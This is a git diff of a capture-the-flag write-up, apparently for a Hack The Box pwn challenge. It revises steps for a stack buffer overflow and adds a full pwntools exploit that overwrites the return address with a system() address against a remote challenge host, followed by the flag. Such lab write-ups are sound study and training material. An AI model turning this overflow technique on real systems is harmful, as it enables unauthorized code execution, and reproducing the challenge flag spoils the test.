@@ -35,25 +35,29 @@ Can you disable the mechanisms and take control of the Admin Panel?
 
 > RESULT
 
-![image](https://user-images.githubusercontent.com/70703371/209362224-8a23b6fa-5cad-4c57-b6fe-e60440078e9d.png)
+![image](https://user-images.githubusercontent.com/70703371/209473239-d41f9b73-858d-4dd0-9223-5986a21548f4.png)
 
 
 8. If we pressed 1, we prompted an input, let's paste 1024 cyclic pattern here.
 
 > RESULT
 
-![image](https://user-images.githubusercontent.com/70703371/209363188-cc550fff-6721-474c-8b48-8aa9c2c14f4e.png)
+![image](https://user-images.githubusercontent.com/70703371/209473266-0c10cff2-bbd9-48c5-a3ac-68f72b55c73f.png)
 
 
 9. Great! The program crashed.
-10. Now utilize the RBP characters to find the correct bytes to overflow the buffer.
+10. Now utilize the 4 RBP characters from behind to find the correct bytes to overflow the buffer.
 
 > RESULT
 
-![image](https://user-images.githubusercontent.com/70703371/209363201-03d6f6d7-de4f-4688-acf6-eb04123f85a8.png)
+![image](https://user-images.githubusercontent.com/70703371/209473284-21caf80f-6b5e-43bb-a01d-a7a47c830810.png)
 
 
-11. Means we need to add 44 padding bytes.
+11. Notice here, since we don't have the RSP offset, so let's use the pattern buffer found -1. -> 56 padding bytes.
+
+![image](https://user-images.githubusercontent.com/70703371/209473313-4a1164a2-86a0-4472-810b-d4e975dcab00.png)
+
+
 12. Anyway let's decompile the file and open the `main()` function.
 
 > RESULT
@@ -68,9 +72,34 @@ Can you disable the mechanisms and take control of the Admin Panel?
 
 
 14. Based from the source code, the read function reads 57 bytes and the program comparing the admin username with the newline after it not a NULL character.
-15. To bypass that simply use `sendafter()` function in **pwntools**.
-16. Here is the full script:
+15. By the way, actually we can get the `system()` address and add that as the return address.
+16. Here is the full script.
 
 ```py
+from pwn import *
+import os
 
+os.system('clear')
+context.log_level = 'debug'
+sh = remote('144.126.232.222',30851)
+p = b'A' * 56
+p += p64(4197138) #0x400b12 # system address
+sh.sendlineafter(b'>>', b'1')
+sh.sendlineafter(b':', p)
+
+sh.interactive()
+
+```
+
+> OUTPUT
+
+![image](https://user-images.githubusercontent.com/70703371/209473377-a05186c4-8306-45a1-b6c5-3c2fbc0785dc.png)
+
+
+17. Got the flag!
+
+## FLAG
+
+```
+HTB{d1g_1n51d3..u_Cry_cry_cry}
 ```
